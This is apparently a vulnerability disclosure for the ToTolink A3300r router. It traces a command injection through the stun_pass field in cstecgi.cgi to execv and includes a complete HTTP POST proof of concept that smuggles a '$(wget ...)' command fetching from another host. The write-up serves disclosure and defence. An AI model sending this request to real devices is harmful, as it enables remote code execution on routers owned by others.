# ToTolink A3300r Vulnerability

Vendor:ToTolink

Product:A3300r

Affected Version: V17.0.0cu.557_B20221024

Firmware Download: https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/241/ids/36.html

Vulnerability: Command Injection

Type:Command Injection Attack




## Descriptions

We found a command injection vulnerability  in `cstecgi.cgi` that could be triggered by an attacker through carefully crafted packet requests:


<div  align="center"><img src="./img/stun-pass-sub_422380.png" style="zoom:80%;" /></div>

The sub_4100F0 function defines a variable `stun_pass`, retrieves its value from the request  packet, and passes its value to the Uci_Set_Str function.

<div  align="center"><img src="./img/uci_set_str.png" style="zoom:80%;" /></div>

This function uses the sprintf function to concatenate it into v11, and finally passes the result to CsteSystem for processing.

<div  align="center"><img src="./img/cstesystem_execv.png" style="zoom:80%;" /></div>

However,the CsteSystem function wraps the command and then passes it to execv to execute the command.


## Proof of Concept (PoC)

We set `stun_pass` as **4343$(wget 192.168.6.1:8888/testpoc)** ,such as:

```http
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.6.2
Content-Length: 248
X-Requested-With: XMLHttpRequest
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Origin: http://192.168.6.2
Referer: http://192.168.6.2/wizard.html?token=
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"addEffect":"0","enable":"1","url":"192.168.123.234","user":"123","pass":"123","informEnable":"0","interval":"","stunEnable":"1","stunServerAddr":"192.168.123.234","stunPort":"4343","stunMaxAlive":"3600","stunMinAlive":"30","stun_user":"123","stun_pass":"123$(wget 192.168.6.1:8888/testpoc)","topicurl":"setTr069Cfg"}
```

## outcome
<div  align="center"><img src="./img/poc-stun-pass.png" style="zoom:80%;" /></div>